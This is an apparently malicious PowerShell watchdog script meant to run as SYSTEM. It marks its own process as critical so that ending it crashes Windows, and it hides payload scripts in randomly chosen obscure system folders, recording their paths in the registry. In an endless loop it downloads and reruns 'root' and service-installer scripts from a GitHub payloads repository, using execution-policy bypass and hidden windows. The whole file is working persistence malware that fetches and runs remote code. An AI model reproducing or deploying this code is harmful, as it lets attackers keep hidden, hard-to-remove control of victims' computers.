#script must run as admin/SYSTEM
param(
    [string]$rootPath,
    [string]$basePath
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami2.txt`""
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
$b = $basePath -replace '([\\{}])', '`$1'

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls"
)

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

$serviceName = "MyRootService" # change this to the name of the service
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$propertyName = "root"
$propertyName2 = "rootMonMon"
$rootmonmonPath = ""


$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
$canUpdateRootPath = $false

if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $true
}

if (-not($item)) {
    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $false
}

else{
    $rootPath = $item.$propertyName
    $canUpdateRootPath = $true
}

$item2 = Get-ItemProperty -Path "$basePath" -Name $propertyName2 -ErrorAction SilentlyContinue
if($item2){
    $rootmonmonPath = $item2.$propertyName2
}

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$initServicePath = $paths[$idx]
$initServicePath = "$initServicePath\init_service_root.ps1"

function Check-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg -path $regPath
    $serv = Check-Service -name $serviceName

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        if($canUpdateRootPath){
            $idx = Get-Random -Minimum 0 -Maximum $paths.Length
            $initServicePath = $paths[$idx]
            $initServicePath = "$initServicePath\init_service_root.ps1"
            $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootPath = "$rootPath\root.ps1"
            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
        }
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    
    elseif($regS -or $serv){
        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
        $initServicePath = $paths[$idx]
        $initServicePath = "$initServicePath\init_service_root.ps1"
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    $canUpdateRootPath=$true

    if(-not(Test-Path -Path $rootmonmonPath -PathType Leaf)){
        $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
        $rootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $rootmonmonPath = "$rootmonmonPath\root_mon_mon.ps1"
        Set-ItemProperty -Path "$basePath" -Name $propertyName2 -Value $rootmonmonPath -Force | Out-Null
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $initServiceRootmonmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonmonPath -rootPath $rootPath -basePath "$b"
    }
    
    Start-Sleep -Seconds 2
}